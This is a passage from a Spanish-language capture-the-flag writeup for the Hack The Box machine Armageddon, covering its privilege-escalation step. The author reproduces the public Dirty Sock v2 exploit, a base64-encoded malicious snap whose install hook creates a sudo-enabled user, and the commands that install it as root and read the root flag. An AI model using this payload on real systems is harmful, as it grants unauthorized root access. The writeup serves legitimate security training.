+</span><span style="color:#e6db74">    USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>,
+    env_keep<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>, secure_path<span style="color:#f92672">=</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/snap install *
+</code></pre></div><p>Viendo los permisos, nos dice que nos permite corre <code>/usr/bin/snap install *</code> como root. O sea, que podemos instalar cualquier paquete con <em>snap</em> como superusuario.
+Existe un exploit conocido para snap que nos permite la escalada de privilegios: <a href="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html"target="_blank" rel="external nofollow noopener noreferrer">Dirty Sock</a>.Existen 2 versiones de este exploit, la más cómoda es la segunda versión.
+Viendo el código <a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py"target="_blank" rel="external nofollow noopener noreferrer">dirty_sockv2.py</a> podemos ver que usa una cadena en <em>base64</em></p>
+<pre tabindex="0"><code># The following global is a base64 encoded string representing an installable
+# snap package. The snap itself is empty and has no functionality. It does,
+# however, have a bash-script in the install hook that will create a new user.
+# For full details, read the blog linked on the github page above.
+TROJAN_SNAP = ('''
+aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
++ 'A' * 4256 + '==')
+</code></pre><p>El código en sí es un script en bash que crea un paquete en snap que contiene el código malicioso creando un usuario como si fuera root.
+Copiando el código a la máquina podemos crear el paquete e instalarlo como root con <code>devmode</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ which python
+/usr/bin/python
+<span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ python -c <span style="color:#e6db74">&#39;print &#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&#34; + &#34;A&#34;*4256 + &#34;==&#34;&#39;</span> | base64 -d &gt; dirty.snap
+
+
+<span style="color:#f92672">[</span>brucetherealadmin@armageddon ~<span style="color:#f92672">]</span>$ sudo /usr/bin/snap install --devmode dirty.snap
+dirty-sock 0.1 installed
+
+<span style="color:#f92672">[</span>dirty_sock@armageddon brucetherealadmin<span style="color:#f92672">]</span>$ sudo su
+...snip...
+
+<span style="color:#f92672">[</span>root@armageddon brucetherealadmin<span style="color:#f92672">]</span><span style="color:#75715e"># cat /root/root.txt &amp;&amp; whoami</span>
+4239bd3a51a2****************
+root
+</code></pre></div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2021-07-24 15:39:00">Updated on 2021-07-24&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/posts/armaggedon-htb/armaggedon-htb/" data-title="Armaggedon HTB Writeup" data-via="jagelit0" data-hashtags="linux,writeup,easy"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/posts/armaggedon-htb/armaggedon-htb/" data-hashtag="linux"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="/posts/armaggedon-htb/armaggedon-htb/" data-title="Armaggedon HTB Writeup" data-image="../assets/posts/armaggedon/banner.png"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/linux/' class="post-tag">linux</a><a href='/tags/writeup/' class="post-tag">writeup</a><a href='/tags/easy/' class="post-tag">easy</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav">
+      <a href="/posts/remote-htb/remote-htb/" class="post-nav-item" rel="next" title="Remote HTB Writeup">Remote HTB Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line custom">[rottenbytes]</div><div class="footer-line statistics"></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"data":{"typeit-header-desktop":"\u003e rottenbytes","typeit-header-title-mobile":"\u003e rottenbytes"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
